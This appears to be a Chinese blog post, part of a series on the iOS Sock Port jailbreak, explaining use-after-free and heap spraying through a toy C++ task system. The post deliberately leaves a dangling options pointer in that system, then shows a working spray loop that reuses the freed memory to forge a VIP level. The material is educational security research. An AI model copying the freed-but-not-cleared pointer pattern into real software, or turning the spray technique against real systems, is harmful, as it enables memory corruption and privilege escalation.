<p>即在用户态透过系统调用等方式在内核堆的不同区域分配大量内存，如果将内核的堆比作墙壁，堆喷射就是通过大量分配内存的方式将同样颜色的油漆（同样的字节）泼洒到堆上，这会导致其颜色（同样的字节）均匀的分布在整个内存平面上，即那些先前被释放的区域几乎都被 Reallocation 成了同样的内容。</p>
<p>简言之就是，比如我们 alloc 了 1 个 8B 的区域，随后将其释放，接下来再执行 alloc 时迟早会对先前的区域进行复用，如果恰好被我们 alloc 时占用，则达到了内容控制的目的。透过这种技术我们可以间接控制堆上的 Reallocation 内容。</p>
<p>显然如果我们将上述 Socket UAF 与 Heap Spraying 组合，就有机会为 Socket Options 分配伪造的内容，随后我们通过 <code>setsockopt</code> 和 <code>getsockopt</code> 执行读写和验证，就能实现对内核堆内存的完全控制。</p>
<h1 id="一个纯用户态的-UAF-amp-Heap-Spraying-例子"><a href="#一个纯用户态的-UAF-amp-Heap-Spraying-例子" class="headerlink" title="一个纯用户态的 UAF &amp; Heap Spraying 例子"></a>一个纯用户态的 UAF &amp; Heap Spraying 例子</h1><p>综合上述理论探讨，我们对堆内存的读写有了初步的认识，事实上事情没有我们想象的那么简单，整个 Sock Port 的利用是基于许多漏洞组合而来的，并非三言两语和一朝一夕能够完全搞懂，因此本文先不展开具体漏洞的内容，而是在用户态模拟一个 UAF 和 Heap Spraying 的场景让大家先从工程上初步认识这两个概念。</p>
<h2 id="假设的漏洞场景"><a href="#假设的漏洞场景" class="headerlink" title="假设的漏洞场景"></a>假设的漏洞场景</h2><p>设想小明是一个初级页面仔，他要开发一个任务执行系统，该系统根据任务的优先级顺序执行任务，任务的优先级取决于用户的 VIP 等级，该 VIP 等级被记录在 task 的 options 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">secret_options</span> &#123;</span></span><br><span class="line">    <span class="keyword">bool</span> isVIP;</span><br><span class="line">    <span class="keyword">int</span> vipLevel;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">secret_task</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> tid;</span><br><span class="line">    <span class="keyword">bool</span> valid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_options</span> *<span class="title">options</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>小明参考了 Mach Message 的设计理念，在系统内部维护 Task 的内存结构，只对外暴露 Task 的句柄（tid），用户可以透过 <code>create_secret_task</code> 创建任务，任务的默认是没有 VIP 等级的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">task_t</span>, struct secret_task *&gt; taskTable;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">task_t</span> <span class="title">create_secret_task</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_task</span> *<span class="title">task</span> = (<span class="title">struct</span> <span class="title">secret_task</span> *)<span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">secret_task</span>));</span></span><br><span class="line">    task-&gt;tid = arc4random();</span><br><span class="line">    <span class="keyword">while</span> (taskTable.<span class="built_in">find</span>(task-&gt;tid = arc4random()) != taskTable.<span class="built_in">end</span>());</span><br><span class="line">    taskTable[task-&gt;tid] = task;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_options</span> *<span class="title">options</span> = (<span class="title">struct</span> <span class="title">secret_options</span> *)<span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">secret_options</span>));</span></span><br><span class="line">    task-&gt;options = options;</span><br><span class="line">    options-&gt;isVIP = <span class="literal">false</span>;</span><br><span class="line">    options-&gt;vipLevel = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> task-&gt;tid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在系统之外，用户能做的只是创建任务、获取 VIP 信息以及获取任务优先级：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">task_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SecretTaskOptIsVIP 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SecretTaskOptVipLevel 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SecretTaskVipLevelMAX 9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_task_priority</span><span class="params">(<span class="keyword">task_t</span> task_id)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_task</span> *<span class="title">task</span> = <span class="title">get_task</span>(<span class="title">task_id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (!task) &#123;</span><br><span class="line">        <span class="keyword">return</span> (~<span class="number">0U</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> task-&gt;options-&gt;isVIP ? (SecretTaskVipLevelMAX - task-&gt;options-&gt;vipLevel) : (~<span class="number">0U</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">secret_get_options</span><span class="params">(<span class="keyword">task_t</span> task_id, <span class="keyword">int</span> optkey, <span class="keyword">void</span> *ret)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_task</span> *<span class="title">task</span> = <span class="title">get_task</span>(<span class="title">task_id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (!task) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (optkey) &#123;</span><br><span class="line">        <span class="keyword">case</span> SecretTaskOptIsVIP:</span><br><span class="line">            *(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">bool</span> *&gt;(ret)) = task-&gt;options-&gt;isVIP;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SecretTaskOptVipLevel:</span><br><span class="line">            *(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span> *&gt;(ret)) = task-&gt;options-&gt;vipLevel;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在理想情况下，不考虑逆向工程的方式，我们只能拿到 Task 的句柄，无法获取 Task 地址，因此无法任意修改 VIP 信息。</p>
<p>小明同时为用户提供了注销任务的 API，他只对任务的 options 进行了释放，同时将任务标记为 invalid，缺乏经验的他忘记清理 options 指针，为系统引入了一个 UAF Exploit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">free_task</span><span class="params">(<span class="keyword">task_t</span> task_id)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">secret_task</span> *<span class="title">task</span> = <span class="title">get_task</span>(<span class="title">task_id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (!task) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(task-&gt;options);</span><br><span class="line">    task-&gt;valid = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="假设的攻击场景"><a href="#假设的攻击场景" class="headerlink" title="假设的攻击场景"></a>假设的攻击场景</h2><p>常规情况下，我们只能透过公共的 API 访问系统：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create task</span></span><br><span class="line"><span class="keyword">task_t</span> task = create_secret_task();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read options</span></span><br><span class="line"><span class="keyword">int</span> vipLevel;</span><br><span class="line">secret_get_options(task, SecretTaskOptVipLevel, &amp;vipLevel);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get priority</span></span><br><span class="line"><span class="keyword">int</span> priority = get_task_priority(leaked_task);</span><br><span class="line"></span><br><span class="line"><span class="comment">// release task</span></span><br><span class="line">free_task(task);</span><br></pre></td></tr></table></figure>

<p>由于 Task 默认是非 VIP 的，我们只能拿到最低优先级 INTMAX。这里我们通过 <code>task-&gt;options</code> 的 UAF 可以伪造 task 的 VIP 等级，方法如下：</p>
<ol>
<li>创建一个 Task，并通过 free_task 函数将其释放，这会构造一个 <code>task-&gt;options</code> 的悬垂指针；</li>
<li>不断分配与 <code>task-&gt;options</code> 指向的 <code>struct secret_options</code> 相同大小的内存区域，直到 <code>task-&gt;options</code> 悬垂指针指向的区域被 Reallocation 成我们新申请的内存，验证方式可以伪造特定数据，随后通过 <code>secret_get_options</code> 读取验证；</li>
<li>此时 <code>struct secret_options</code> 已经指向了我们新申请的区域，可以通过修改该区域实现对 Task Options 的修改。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">faked_secret_options</span> &#123;</span></span><br><span class="line">    <span class="keyword">bool</span> isVIP;</span><br><span class="line">    <span class="keyword">int</span> vipLevel;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">faked_secret_options</span> *<span class="title">sprayPayload</span> = <span class="title">nullptr</span>;</span></span><br><span class="line"><span class="keyword">task_t</span> leaked_task = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// create task</span></span><br><span class="line">    <span class="keyword">task_t</span> task = create_secret_task();</span><br><span class="line">    <span class="comment">// free to make dangling options</span></span><br><span class="line">    free_task(task);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// alloc to spraying</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">faked_secret_options</span> *<span class="title">fakedOptions</span> = (<span class="title">struct</span> <span class="title">faked_secret_options</span> *)<span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">faked_secret_options</span>));</span></span><br><span class="line">    fakedOptions-&gt;isVIP = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// to verify</span></span><br><span class="line">    fakedOptions-&gt;vipLevel = <span class="number">0x123456</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// check by vipLevel</span></span><br><span class="line">    <span class="keyword">int</span> vipLevel;</span><br><span class="line">    secret_get_options(task, SecretTaskOptVipLevel, &amp;vipLevel);</span><br><span class="line">    <span class="keyword">if</span> (vipLevel == <span class="number">0x123456</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"spray succeeded at %d!!!\n"</span>, i);</span><br><span class="line">        sprayPayload = fakedOptions;</span><br><span class="line">        leaked_task = task;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// modify</span></span><br><span class="line"><span class="keyword">if</span> (sprayPayload) &#123;</span><br><span class="line">    sprayPayload-&gt;vipLevel = <span class="number">9</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于是纯用户态、同一线程内的同步操作，这种方式的成功率极高。当然这种方式只能让大家对 UAF 与 Heap Spraying 有一个大致认识，<strong>实际上这类漏洞利用都是跨进程的，需要非常复杂的操作，往往需要借助于 Mach Message 和 IOSurface，且 Payload 构造十分复杂</strong>。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>在下一个章节中我们将开始着手分析 Sock Port 的源码，了解来自 <a href="https://en.wikipedia.org/wiki/Ian_Beer" target="_blank" rel="noopener">Ian Beer</a> 大佬的 kalloc 系列函数以及利用 IOSurface 进行 Heap Spraying 的方式和原理。其中 kalloc 系列函数需要对 Mach Message 有深入的认识，因此在下一篇文章中我们也会从 XNU 源码角度分析 mach port 的设计。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li>Andy Slye. What Is Jailbreaking? How a Jailbreak Works - <a href="https://www.youtube.com/watch?v=tYKfXNiA1wc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=tYKfXNiA1wc</a></li>
<li>Webopedia. Use After Free - <a href="https://www.webopedia.com/TERM/U/use-after-free.html" target="_blank" rel="noopener">https://www.webopedia.com/TERM/U/use-after-free.html</a></li>
<li>Computer Hope. Heap spraying - <a href="https://www.computerhope.com/jargon/h/heap-spraying.htm" target="_blank" rel="noopener">https://www.computerhope.com/jargon/h/heap-spraying.htm</a></li>
<li>GitHub. jakeajames/sock_port - <a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">https://github.com/jakeajames/sock_port/tree/sock_port_2</a></li>
</ol>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>